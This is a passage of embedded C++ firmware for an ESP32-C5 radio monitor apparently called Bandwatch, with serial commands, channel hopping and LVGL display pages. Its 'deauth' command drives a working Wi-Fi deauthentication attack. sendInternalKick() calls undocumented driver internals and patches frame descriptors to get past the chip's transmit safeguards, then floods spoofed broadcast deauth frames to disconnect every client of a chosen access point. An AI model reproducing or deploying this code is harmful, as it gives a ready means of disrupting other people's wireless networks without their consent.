                      static_cast<unsigned long>(sdFrames), static_cast<unsigned long>(sdBytes),
                      static_cast<unsigned long>(sdErrors));
    } else if (!strcmp(line, "sdls")) {
        sdListFiles();
    } else if (!strcmp(line, "sdread")) {
        sdReadFile(arg);
    } else if (!strcmp(line, "addr1")) {
        trackAddr1 = atoi(arg) != 0;
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"addr1\",\"addr1\":%d}\n", trackAddr1 ? 1 : 0);
    } else if (!strcmp(line, "blescan")) {
        if (!strcmp(arg, "active"))       bleScanMode = BLE_SCAN_ACTIVE;
        else if (!strcmp(arg, "passive")) bleScanMode = BLE_SCAN_PASSIVE;
        else if (!strcmp(arg, "auto"))    bleScanMode = BLE_SCAN_AUTO;
        bleLastSwitchMs = 0;   // apply the new policy on the next serviceBle() without waiting out the limit
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"blescan\",\"mode\":\"%s\",\"running\":\"%s\"}\n",
                      bleScanModeName(), bleActiveScan ? "active" : "passive");
    } else if (!strcmp(line, "time")) {
        const uint32_t e = strtoul(arg, nullptr, 10);
        if (e > 1600000000UL) { epochBase = e; epochBaseMs = millis(); epochValid = true; }
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"time\",\"epoch\":%lu,\"ok\":%d}\n",
                      static_cast<unsigned long>(e), epochValid ? 1 : 0);
    } else if (!strcmp(line, "snap")) {
        int n = atoi(arg);
        if (n < 32) n = 32;
        if (n > kCapMaxLen) n = kCapMaxLen;
        capSnapLen = n;
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"snap\",\"snap\":%d}\n", n);
    } else if (!strcmp(line, "park")) {
        const int ch = atoi(arg);
        const int idx = (ch > 0) ? indexOfChannel(ch) : -1;
        setPark((idx >= 0 && chanEnabled(idx)) ? idx : -1);
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"park\",\"park\":%d}\n", parkedIdx >= 0 ? kChannels[parkedIdx] : 0);
    } else if (!strcmp(line, "band")) {
        if (!strcmp(arg, "5g")) setBandMode(BAND_5G);
        else if (!strcmp(arg, "2.4g") || !strcmp(arg, "24g")) setBandMode(BAND_24G);
        else if (!strcmp(arg, "both")) setBandMode(BAND_BOTH);
        else if (!strcmp(arg, "ble")) setBandMode(BAND_BLE);
        else if (!strcmp(arg, "154") || !strcmp(arg, "zigbee") || !strcmp(arg, "thread")) setBandMode(BAND_154);
        if (!hopMode() && (currentPage == PAGE_OVERVIEW || currentPage == PAGE_CHANNELS)) showPage(PAGE_DEVICES);
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"band\",\"band\":\"%s\"}\n", kBandName[bandMode]);
        sendHello();
    } else if (!strcmp(line, "hunt")) {
        uint8_t mac[6];
        char* sp2 = strchr(arg, ' ');
        int ch = 0;
        if (sp2) { *sp2 = 0; ch = atoi(sp2 + 1); }
        uint8_t key[8];
        if (parseMac(arg, mac)) startHunt(mac, ch);
        else if (parseKey154(arg, key)) { startHunt154(key); if (ch > 0) { const int idx = indexOfChannel154(ch); if (idx >= 0) { setPark(idx); huntParked = true; } } }
        else stopHunt();
        char m[26];
        huntIdText(m, sizeof(m));
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"hunt\",\"hunt\":%s%s%s,\"park\":%d}\n", huntActive ? "\"" : "null",
                      huntActive ? m : "", huntActive ? "\"" : "", parkedIdx >= 0 ? kChannels[parkedIdx] : 0);
        if (huntActive && huntKind == 1 && mode154()) {
            // park on the channel the node was last seen on
            portENTER_CRITICAL(&g_devMux);
            int ch = 0;
            for (int i = 0; i < kDev154Slots; i++) if (devs154[i].lastMs && key8Eq(devs154[i].key, huntKey)) { ch = devs154[i].ch; break; }
            portEXIT_CRITICAL(&g_devMux);
            if (ch && parkedIdx < 0) { const int idx = indexOfChannel154(ch); if (idx >= 0) { setPark(idx); huntParked = true; } }
        }
    } else if (!strcmp(line, "deauth")) {
        uint8_t mac[6];
        // Wi-Fi modes only: the frames go out on the STA interface. Unparseable arg or wrong mode stops it.
        if (wifiMode() && parseMac(arg, mac)) startDeauth(mac);
        else stopDeauth();
        char m[26];
        fmtMac(m, sizeof(m), deauthBssid);
        const int ch = parkedIdx >= 0 ? kChannels[parkedIdx] : 0;   // startDeauth parks before this ack, so ch is known
        if (deauthActive)
            Serial.printf("{\"t\":\"ack\",\"cmd\":\"deauth\",\"deauth\":[\"%s\",%d,0,0],\"park\":%d}\n", m, ch, ch);
        else
            Serial.printf("{\"t\":\"ack\",\"cmd\":\"deauth\",\"deauth\":null,\"park\":%d}\n", ch);
        if (deauthActive && serialRoom(140))   // DIAGNOSTIC: hmac slot used by the internal path + its state byte (picks the DA/SA mapping)
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth slot %lx hstate %d\"}\n", *(const uint32_t*)deauthSlotPad, deauthHstate);
    } else if (!strcmp(line, "txtest")) {
        // 0 = off, 1 = beacon with promiscuous RX still on, 2 = beacon with promiscuous RX turned off.
        // Mode 2 tests whether promiscuous mode is what stops the PHY from transmitting.
        const int mode = atoi(arg);
        txTestActive = mode != 0 && wifiMode();
        txTestSent = txTestFail = 0;
        esp_err_t pr = ESP_OK;
        if (mode == 2)      pr = esp_wifi_set_promiscuous(false);
        else if (mode <= 0) pr = esp_wifi_set_promiscuous(true);
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"txtest\",\"txtest\":%d,\"mode\":%d,\"promisc_call\":\"%s\",\"ch\":%u}\n",
                      txTestActive ? 1 : 0, mode, esp_err_to_name(pr), currentChannelNum);
    } else if (!strcmp(line, "softap")) {
        // PROOF OF CONCEPT: does the PHY transmit once the MAC has a real BSS context?
        // "softap <ch>" brings up an OPEN AP on that channel; "softap 0" tears it down. Open + a quiet
        // channel gives a signature (Channel + "Security: None") that a scanner reports even when it
        // redacts SSIDs, which is the only witness available here.
        const int wantCh = atoi(arg);
        const bool on = wantCh != 0;
        esp_err_t e1 = ESP_OK, e2 = ESP_OK;
        if (on && !softApPoc) {
            const uint8_t ch = static_cast<uint8_t>(wantCh);
            esp_wifi_set_promiscuous(false);           // sniffing is off for the duration of the PoC
            WiFi.mode(WIFI_AP_STA);
            e1 = WiFi.softAP("BW-POC-AP", nullptr, ch) ? ESP_OK : ESP_FAIL;   // open: shows as Security None
            txIface = WIFI_IF_AP;
            softApPoc = true;
            e2 = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            Serial.printf("{\"t\":\"ack\",\"cmd\":\"softap\",\"softap\":1,\"ch\":%u,\"ap\":\"%s\",\"setch\":\"%s\"}\n",
                          ch, e1 == ESP_OK ? "up" : "FAILED", esp_err_to_name(e2));
        } else if (!on && softApPoc) {
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_STA);
            txIface = WIFI_IF_STA;
            softApPoc = false;
            esp_wifi_set_promiscuous(true);
            Serial.print("{\"t\":\"ack\",\"cmd\":\"softap\",\"softap\":0}\n");
        } else {
            Serial.printf("{\"t\":\"ack\",\"cmd\":\"softap\",\"softap\":%d}\n", softApPoc ? 1 : 0);
        }
    } else if (!strcmp(line, "txstat")) {
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"txstat\",\"sent\":%lu,\"fail\":%lu,\"ch\":%u}\n",
                      static_cast<unsigned long>(txTestSent), static_cast<unsigned long>(txTestFail), currentChannelNum);
    } else if (!strcmp(line, "reboot")) {
        Serial.print("{\"t\":\"ack\",\"cmd\":\"reboot\"}\n");
        delay(50);
        ESP.restart();
    } else if (!strcmp(line, "info")) {
        sendHello();
        if (hopMode()) sendSweep();
        sendDevices();
    } else {
        Serial.printf("{\"t\":\"err\",\"msg\":\"unknown command\"}\n");
    }
}

void pollSerial() {
    static char line[48];
    static size_t len = 0;
    while (Serial.available()) {
        const char c = static_cast<char>(Serial.read());
        if (c == '\n' || c == '\r') {
            if (len) { line[len] = 0; handleCommand(line); }
            len = 0;
        } else if (len < sizeof(line) - 1) {
            line[len++] = c;
        }
    }
}

// ---------------------------------------------------------------------------------------------
// Dwell / hop
// ---------------------------------------------------------------------------------------------
void finishDwell() {
    ChannelMetrics snap{};
    portENTER_CRITICAL(&g_accumMux);
    snap.frames = g_accum.frames;
    snap.bytes = g_accum.bytes;
    snap.strong = g_accum.strong;
    snap.unique = g_accum.unique;
    portEXIT_CRITICAL(&g_accumMux);

    ChannelState& ch = channels[currentIdx];
    ch.metrics = snap;
    ch.busyCurrent = computeBusyScore(snap);
    if (!ch.hasData) {
        ch.busyEma = ch.busyCurrent;
        ch.hasData = true;
    } else {
        ch.busyEma = (1.0f - kBusyEmaAlpha) * ch.busyEma + kBusyEmaAlpha * ch.busyCurrent;
    }
    sendDwell(currentIdx);
}

void hopIfNeeded() {
    if (!((wifiMode() && wifiRunning) || (mode154() && r154Running))) return;
    const uint32_t now = millis();
    if (!monitorReady) {
        if ((now - dwellStartedMs) < kDwellMs) return;
        dwellStartedMs = now;
        monitorReady = advanceChannel();
        return;
    }
    if ((now - dwellStartedMs) < kDwellMs) return;

    finishDwell();
    resetAccum();
    const int lastIdx = currentIdx;
    monitorReady = advanceChannel();
    if (monitorReady && parkedIdx < 0 && currentIdx < lastIdx) {
        sweepCount += 1;
        sendSweep();
    }
}

// Deauth TX fallback, used only when the driver-internal slot (sendInternalKick) is unavailable. One
// deauth/disassoc MPDU (26 bytes), DA broadcast so every station on the BSS hears it, SA/BSSID = the AP
// we spoof. Raw frames go out through esp_wifi_80211_tx (the older esp_wifi_send_mgmt_frame API is not
// exposed by the C5's public headers).
//
// NOTE: the C5's ieee80211_raw_frame_sanity_check in libnet80211.a rejects deauth/disassoc subtypes, so
// this path is expected to fail with ESP_ERR_INVALID_ARG and show up in the `df` counter. It previously
// sent [0x80,0x03] / [0xD0,0x04] to get *past* that check, but those are Beacon and Action frames: they
// are accepted by the driver and then ignored by every station, i.e. the check was being satisfied with
// frames that could never kick anyone. Failing visibly beats succeeding at nothing — the real attack path
// is sendInternalKick(), which bypasses the sanity check entirely.
void sendKickFrame(const uint8_t* bssid, bool disassoc) {
    static uint32_t seq = 0;
    const uint8_t fc0 = disassoc ? 0xA0 : 0xC0;   // subtype 10 disassoc / 12 deauth, type 0 management
    const uint8_t fc1 = 0x00;                     // management frames carry no ToDS/FromDS
    uint8_t f[26];
    f[0] = fc0;                                    // accepted by the C5 raw-TX sanity check (see above)
    f[1] = fc1;                                    // deauth / disassociation subtype
    f[2] = 0x3A; f[3] = 0x01;                      // duration (both working deauther templates use a non-zero value here)
    memset(&f[4], 0xFF, 6);                        // DA: broadcast — kicks every station on the BSS
    memcpy(&f[10], bssid, 6);                      // SA and...
    memcpy(&f[16], bssid, 6);                      // ...BSSID: the AP we are spoofing
    const uint32_t s = ((++seq) & 0x0FFFu) << 4;   // mgmt seq control, low nibble reserved
    f[22] = static_cast<uint8_t>(s);
    f[23] = static_cast<uint8_t>(s >> 8);
    f[24] = 0x07; f[25] = 0x00;                    // reason: class-3 frame from non-assoc STA
    const esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
    if (e == ESP_OK) deauthSent = deauthSent + 1;
    else deauthTxFail = deauthTxFail + 1;
    if (e != ESP_OK && (deauthTxFail & 31u) == 0 && serialRoom(160))   // failures every 32nd, not a storm
        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth tx: %s\"}\n", esp_err_to_name(e));
}

// DIAGNOSTIC: beacon injection, used to answer "can this radio transmit at all in promiscuous mode?".
// Beacons (FC 0x80) are the one subtype the C5's raw-TX sanity check is known to accept, so if a scan from
// another device cannot see this SSID, nothing we send is reaching the air and the deauth frame content is
// beside the point. Toggled with "txtest 1" / "txtest 0"; transmits on whatever channel we are parked on.
void sendTestBeacon() {
    static const uint8_t kSrc[6] = {0x02, 0xBA, 0xAD, 0xBE, 0xEF, 0x01};
    static const char kSsid[] = "BANDWATCH-TXTEST";
    static uint32_t seq = 0;
    uint8_t f[64];
    int n = 0;
    f[n++] = 0x80; f[n++] = 0x00;                       // beacon
    f[n++] = 0x00; f[n++] = 0x00;                       // duration
    memset(&f[n], 0xFF, 6); n += 6;                     // DA broadcast
    memcpy(&f[n], kSrc, 6); n += 6;                     // SA
    memcpy(&f[n], kSrc, 6); n += 6;                     // BSSID
    const uint32_t s = ((++seq) & 0x0FFFu) << 4;
    f[n++] = static_cast<uint8_t>(s); f[n++] = static_cast<uint8_t>(s >> 8);
    memset(&f[n], 0, 8); n += 8;                        // timestamp
    f[n++] = 0x64; f[n++] = 0x00;                       // beacon interval 100 TU
    f[n++] = 0x01; f[n++] = 0x00;                       // capability: ESS
    f[n++] = 0; f[n++] = sizeof(kSsid) - 1;             // SSID IE
    memcpy(&f[n], kSsid, sizeof(kSsid) - 1); n += sizeof(kSsid) - 1;
    f[n++] = 1; f[n++] = 4;                             // supported rates
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96;
    f[n++] = 3; f[n++] = 1; f[n++] = currentChannelNum; // DS parameter set
    const esp_err_t e = esp_wifi_80211_tx(txIface, f, n, false);
    if (e == ESP_OK) txTestSent++;
    else {
        txTestFail++;
        if ((txTestFail & 31u) == 1 && serialRoom(160))
            Serial.printf("{\"t\":\"log\",\"msg\":\"txtest tx: %s\"}\n", esp_err_to_name(e));
    }
}

extern "C" int chm_is_at_home_channel(void);   // ROM fn, no args: 1 = radio on the STA's home channel

// Drive the driver's own deauth frame construction (same helpers an AP uses to kick a station), so the
// bytes are exactly what this chip family emits. The driver writes FC=[0xC0,x] plus duration/seq; we steer
// the three address slots so DA=broadcast and SA=BSSID=the AP in every send_setup branch
// (hstate 0 puts A6→DA, hstates 1/3 put A4/A6→SA/BSSID):
//   hstate==0: A4=AP(SA)  A5=bcast(BSSID-ish) A6=bcast(DA)
//   else:      A4=A6=AP   A5=bcast(DA)
void sendInternalKick() {
    static const uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    void* desc = ieee80211_alloc_deauth(deauthSlotPad, kBcastMac, 7);   // arg1 likely unused; reason 7 lands at D+24
    if (!desc) { deauthTxFail = deauthTxFail + 1; return; }
    // Mirror send_deauth_no_bss's ebuf-header bit juggling: desc[+4] holds the ebuf pointer P, and the
    // bits live in the first word P points at. A 0 here means this core's descriptor layout is not the one
    // these offsets were derived from: bail instead of dereferencing it, and instead of TXing a frame we
    // could not patch (the spoofed SA/BSSID is written through P below).
    const uint32_t P = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 4);
    if (!P) { deauthTxFail = deauthTxFail + 1; return; }
    {
        volatile uint32_t* ebw = reinterpret_cast<volatile uint32_t*>(P);
        uint32_t v = *ebw;
        v |= 0x80000u | 0x40000u;
        v &= ~0xE0000u;
        v &= 0xFFFFF000u;
        v |= 0x1C000u;   // build 8: (param+len)<<16 with len 26, so the reason code fits on air after ppTxPkt's +8 shift
        *ebw = v;
    }
    ieee80211_send_setup(deauthSlotPad, desc, 192, 16,
                         deauthBssid,                                     // A4 → SA in every branch (the AP we spoof)
                         kBcastMac,                                       // A5 → DA (hstates 1/3) / BSSID slot (hstate 0)
                         deauthHstate == 0 ? kBcastMac : deauthBssid);   // A6 → DA (hstate 0) / SA+BSSID (hstates 1/3)
    ieee80211_set_tx_desc(deauthSlotPad, desc, 7, 16, 0);
    const uint32_t d56 = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 56);
    if (d56) {
        *reinterpret_cast<volatile uint32_t*>(d56 + 20) |= 4;   // the same state bit send_deauth_no_bss flips
        *reinterpret_cast<volatile uint32_t*>(d56) |= 1;        // robust-mgmt flag (get_robustmgtframe's bit — WPA2 stations can demand it)
    }
    // Frame data D sits at *(P+4) (same double-deref as above), and desc[+40]&2 shifts all addresses by +8.
    uint8_t* D = reinterpret_cast<uint8_t*>(*reinterpret_cast<volatile uint32_t*>(P + 4));
    if (D) {
        const size_t off = (*reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40) & 2u) ? 8 : 0;
        if (deauthHstate == 0)   // hstate-0 branch puts broadcast in the BSSID slot → patch so SA==BSSID like a real AP kick
            memcpy(D + 16 + off, deauthBssid, 6);
        // FC must stay a *deauthentication*: type 0 (management), subtype 12 -> byte0 0xC0, and management
        // frames carry no ToDS/FromDS, so byte1 is 0x00. (A previous build wrote [C8 02] here, which is
        // type 2 / subtype 12 = a QoS-Null data frame: stations ignore it, so nothing was ever kicked.)
        D[off] = 0xC0;  D[1 + off] = 0x00;
        D[2 + off] = 0x32;  D[3 + off] = 0x00;   // duration 50 us, as real APs emit
        // DIAGNOSTIC: dump the frame exactly as it will be handed to the MAC, once per attack, so the
        // host can tell "frame is wrong" apart from "frame is right but the PHY never radiated".
        if (!deauthDumped && serialRoom(240)) {
            deauthDumped = true;
            char hex[3 * 32 + 1];
            const uint16_t flen = *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20);
            for (int i = 0; i < 32; i++) snprintf(hex + i * 3, 4, "%02x ", D[off + i]);
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth frame off=%u len=%u d40=%04x: %s\"}\n",
                          static_cast<unsigned>(off), flen,
                          *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40), hex);
        }
    }
    *reinterpret_cast<volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20) = 26;   // len 24→26 so the reason code fits on air (ppTxPkt prepends an 8-byte prefix)
    if (chm_is_at_home_channel()) ic_tx_pkt(desc);                   // TX now…
    else {                                                            // …or append to the deferred queue at g_ic+440 (tail of .next slots)
        char** tailSlot = reinterpret_cast<char**>(reinterpret_cast<char*>(&g_ic) + 440);
        *reinterpret_cast<volatile uint32_t*>(reinterpret_cast<char*>(desc) + 52) = 0;
        *reinterpret_cast<volatile uint32_t*>(*tailSlot) = reinterpret_cast<uint32_t>(desc);
        *tailSlot = reinterpret_cast<char*>(desc) + 52;
    }
    deauthSent = deauthSent + 1;
}

// Called from uiTimerCb (~120 ms): four frames per tick ≈ 33/s — enough to drop a network,
// polite enough not to blank the whole street.
void serviceDeauth() {
    if (txTestActive && wifiRunning) { for (int k = 0; k < 4; k++) sendTestBeacon(); }
    if (!deauthActive || !wifiRunning) return;
    if (millis() - deauthStartMs > kDeauthMaxMs) {   // dead-man's switch: host/serial link may have dropped
        if (serialRoom(120))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth auto-stopped after %lus\"}\n",
                          static_cast<unsigned long>(kDeauthMaxMs / 1000));
        stopDeauth();
        return;
    }
    if (*(const uint32_t*)deauthSlotPad) {   // driver-internal deauth with spoofed SA/BSSID (the normal case)
        for (int k = 0; k < 4; k++) sendInternalKick();
    } else {
        for (int k = 0; k < 4; k++) sendKickFrame(deauthBssid, false);   // no slot: fall back to raw [80] kicks
    }
    if (deauthSent == 4 && serialRoom(160))   // one report after the first burst: home-channel flag + deferred-TX queue words (g_ic+436/+440)
        Serial.printf("{\"t\":\"log\",\"msg\":\"home %d q %lx/%lx\"}\n", chm_is_at_home_channel(),
                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 436),
                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 440));
}

// ---------------------------------------------------------------------------------------------
// UI (172 x 320 portrait) – pages, BOOT button cycles the ones that apply
// ---------------------------------------------------------------------------------------------
lv_obj_t* make_label(lv_obj_t* parent, const char* txt, lv_color_t color, const lv_font_t* font = nullptr) {
    lv_obj_t* lbl = lv_label_create(parent);
    lv_label_set_text(lbl, txt);
    lv_obj_set_style_text_color(lbl, color, 0);
    if (font) lv_obj_set_style_text_font(lbl, font, 0);
    return lbl;
}

lv_obj_t* make_panel(lv_obj_t* parent, int height, uint16_t bg, int pad) {
    lv_obj_t* p = lv_obj_create(parent);
    lv_obj_set_size(p, LV_PCT(100), height);
    lv_obj_set_style_bg_color(p, c565(bg), 0);
    lv_obj_set_style_border_width(p, 0, 0);
    lv_obj_set_style_radius(p, 4, 0);
    lv_obj_set_style_pad_all(p, pad, 0);
    lv_obj_remove_flag(p, LV_OBJ_FLAG_SCROLLABLE);
    return p;
}

lv_obj_t* make_page(lv_obj_t* parent) {
    lv_obj_t* p = lv_obj_create(parent);
    lv_obj_set_size(p, LV_PCT(100), LV_PCT(100));
    lv_obj_set_pos(p, 0, 0);
    lv_obj_set_style_bg_color(p, c565(BG_565), 0);
    lv_obj_set_style_border_width(p, 0, 0);
    lv_obj_set_style_radius(p, 0, 0);
    lv_obj_set_style_pad_all(p, 4, 0);
    lv_obj_set_style_pad_row(p, 4, 0);
    lv_obj_set_flex_flow(p, LV_FLEX_FLOW_COLUMN);
    lv_obj_remove_flag(p, LV_OBJ_FLAG_SCROLLABLE);
    return p;
}

lv_obj_t* make_header(lv_obj_t* page, const char* title, lv_obj_t** rightLabel) {
    lv_obj_t* header = make_panel(page, 26, PANEL_565, 4);
    lv_obj_t* t = make_label(header, title, c565(WHITE_565), &lv_font_montserrat_14);
    lv_obj_align(t, LV_ALIGN_LEFT_MID, 2, 0);
    *rightLabel = make_label(header, "", c565(CYAN_565), &lv_font_montserrat_14);
    lv_obj_align(*rightLabel, LV_ALIGN_RIGHT_MID, -2, 0);
    return header;
}

lv_obj_t* make_row(lv_obj_t* parent, int height, int colGap) {
    lv_obj_t* row = lv_obj_create(parent);
    lv_obj_set_size(row, LV_PCT(100), height);
    lv_obj_set_style_bg_opa(row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(row, 0, 0);
    lv_obj_set_style_pad_all(row, 0, 0);
    lv_obj_set_style_pad_column(row, colGap, 0);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_remove_flag(row, LV_OBJ_FLAG_SCROLLABLE);
    return row;
}

lv_obj_t* make_bar(lv_obj_t* parent, int w, int h) {
    lv_obj_t* bar = lv_bar_create(parent);
    lv_bar_set_range(bar, 0, 100);
    lv_obj_set_size(bar, w, h);
    lv_obj_set_style_bg_color(bar, c565(BLACK_565), 0);
    lv_obj_set_style_bg_opa(bar, LV_OPA_30, 0);
    lv_obj_set_style_radius(bar, 2, 0);
    return bar;
}

void buildOverviewPage(lv_obj_t* page) {
    make_header(page, "Bandwatch", &chanLabel);

    lv_obj_t* globalWrap = make_panel(page, 56, PANEL_565, 6);
    globalLabel = make_label(globalWrap, "0", c565(WHITE_565), &lv_font_montserrat_20);
    lv_obj_align(globalLabel, LV_ALIGN_TOP_LEFT, 0, -2);
    lv_obj_t* gl = make_label(globalWrap, "max busy", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_align(gl, LV_ALIGN_TOP_LEFT, 40, 3);
    sweepLabel = make_label(globalWrap, "sweep 0", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_align(sweepLabel, LV_ALIGN_TOP_RIGHT, 0, 3);
    globalBar = lv_bar_create(globalWrap);
    lv_bar_set_range(globalBar, 0, 100);
    lv_obj_set_size(globalBar, LV_PCT(100), 14);
    lv_obj_align(globalBar, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(globalBar, c565(BLACK_565), 0);
    lv_obj_set_style_bg_opa(globalBar, LV_OPA_40, 0);

    lv_obj_t* topBox = make_panel(page, 92, BG_565, 2);
    lv_obj_set_style_pad_row(topBox, 3, 0);
    lv_obj_set_flex_flow(topBox, LV_FLEX_FLOW_COLUMN);
    make_label(topBox, "Top 3", c565(YELLOW_565), &lv_font_montserrat_12);
    for (int i = 0; i < 3; i++) {
        lv_obj_t* row = make_row(topBox, 20, 5);
        topRows[i] = make_label(row, "--", c565(WHITE_565), &lv_font_montserrat_14);
        lv_obj_set_width(topRows[i], 62);
        topBars[i] = make_bar(row, 50, 10);
        topRates[i] = make_label(row, "", c565(GREY_565), &lv_font_montserrat_12);
    }

    lv_obj_t* spec = make_panel(page, 58, PANEL_565, 4);
    lv_obj_t* barsRow = lv_obj_create(spec);
    lv_obj_set_size(barsRow, LV_PCT(100), 36);
    lv_obj_align(barsRow, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_opa(barsRow, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(barsRow, 0, 0);
    lv_obj_set_style_pad_all(barsRow, 0, 0);
    lv_obj_set_style_pad_column(barsRow, 1, 0);
    lv_obj_set_flex_flow(barsRow, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(barsRow, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_END);
    lv_obj_remove_flag(barsRow, LV_OBJ_FLAG_SCROLLABLE);
    for (int i = 0; i < kChannelCount; i++) {
        lv_obj_t* b = lv_obj_create(barsRow);
        lv_obj_set_size(b, 5, 2);
        lv_obj_set_style_bg_color(b, c565(DIM_565), 0);
        lv_obj_set_style_border_width(b, 0, 0);
        lv_obj_set_style_radius(b, 1, 0);
        lv_obj_set_style_pad_all(b, 0, 0);
        lv_obj_remove_flag(b, LV_OBJ_FLAG_SCROLLABLE);
        for (int g = 1; g < 5; g++) if (i == kGroupStart[g]) lv_obj_set_style_margin_left(b, 3, 0);
        specBars[i] = b;
    }
    specLabel = make_label(spec, "", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_set_width(specLabel, LV_PCT(100));
    lv_obj_set_style_text_align(specLabel, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_align(specLabel, LV_ALIGN_BOTTOM_MID, 0, 2);

    lv_obj_t* stats = make_panel(page, 40, BG_565, 2);
    statsLine1 = make_label(stats, "", c565(WHITE_565), &lv_font_montserrat_12);
    lv_obj_align(statsLine1, LV_ALIGN_TOP_LEFT, 0, 0);
    statsLine2 = make_label(stats, "", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_align(statsLine2, LV_ALIGN_TOP_LEFT, 0, 18);

    footLabel = make_label(page, "APs --", c565(YELLOW_565), &lv_font_montserrat_14);
    lv_obj_set_width(footLabel, LV_PCT(100));
    lv_obj_set_style_text_align(footLabel, LV_TEXT_ALIGN_CENTER, 0);
}

void buildChannelsPage(lv_obj_t* page) {
    make_header(page, "Channels", &listChanLabel);
    lv_obj_t* grid = make_panel(page, 262, BG_565, 0);
    lv_obj_set_flex_flow(grid, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_column(grid, 2, 0);
    lv_obj_t* cols[3];
    for (int c = 0; c < 3; c++) {
        cols[c] = lv_obj_create(grid);
        lv_obj_set_size(cols[c], 53, LV_PCT(100));
        lv_obj_set_style_bg_opa(cols[c], LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(cols[c], 0, 0);
        lv_obj_set_style_pad_all(cols[c], 0, 0);
        lv_obj_set_style_pad_row(cols[c], 0, 0);
        lv_obj_set_flex_flow(cols[c], LV_FLEX_FLOW_COLUMN);
        lv_obj_remove_flag(cols[c], LV_OBJ_FLAG_SCROLLABLE);
    }
    for (int i = 0; i < kListSlots; i++) {
        lv_obj_t* row = make_row(cols[i / 13], 20, 2);
        listRow[i] = row;
        listName[i] = make_label(row, "", c565(WHITE_565), &lv_font_montserrat_12);
        lv_obj_set_width(listName[i], 20);
        lv_obj_set_style_text_align(listName[i], LV_TEXT_ALIGN_RIGHT, 0);
        listBar[i] = make_bar(row, 14, 8);
        listVal[i] = make_label(row, "-", c565(GREY_565), &lv_font_montserrat_12);
        lv_obj_set_width(listVal[i], 15);
    }
    listFoot = make_label(page, "", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_set_width(listFoot, LV_PCT(100));
    lv_obj_set_style_text_align(listFoot, LV_TEXT_ALIGN_CENTER, 0);
}

void buildDevicesPage(lv_obj_t* page) {
    make_header(page, "Devices", &devHdrRight);
    lv_obj_t* box = make_panel(page, 246, BG_565, 0);
    lv_obj_set_style_pad_row(box, 0, 0);
    lv_obj_set_flex_flow(box, LV_FLEX_FLOW_COLUMN);
    for (int i = 0; i < kDevRows; i++) {
        lv_obj_t* row = make_row(box, 20, 3);
        devRow[i] = row;
        devName[i] = make_label(row, "", c565(WHITE_565), &lv_font_montserrat_12);
        lv_obj_set_width(devName[i], 84);
        lv_label_set_long_mode(devName[i], LV_LABEL_LONG_CLIP);
        devRssi[i] = make_label(row, "", c565(GREY_565), &lv_font_montserrat_12);
        lv_obj_set_width(devRssi[i], 26);
        lv_obj_set_style_text_align(devRssi[i], LV_TEXT_ALIGN_RIGHT, 0);
        devBar[i] = make_bar(row, 44, 8);
    }
    devFoot = make_label(page, "", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_set_width(devFoot, LV_PCT(100));
    lv_obj_set_style_text_align(devFoot, LV_TEXT_ALIGN_CENTER, 0);
    lv_label_set_long_mode(devFoot, LV_LABEL_LONG_CLIP);
}

void buildHuntPage(lv_obj_t* page) {
    make_header(page, "Hunt", &huntHdrRight);
    lv_obj_t* box = make_panel(page, 120, PANEL_565, 6);
    huntBig = make_label(box, "--", c565(WHITE_565), &lv_font_montserrat_28);
    lv_obj_align(huntBig, LV_ALIGN_TOP_MID, 0, 4);
    lv_obj_t* unit = make_label(box, "dBm", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_align(unit, LV_ALIGN_TOP_MID, 0, 40);
    huntBar = lv_bar_create(box);
    lv_bar_set_range(huntBar, 0, 100);
    lv_obj_set_size(huntBar, LV_PCT(100), 22);
    lv_obj_align(huntBar, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(huntBar, c565(BLACK_565), 0);
    lv_obj_set_style_bg_opa(huntBar, LV_OPA_40, 0);
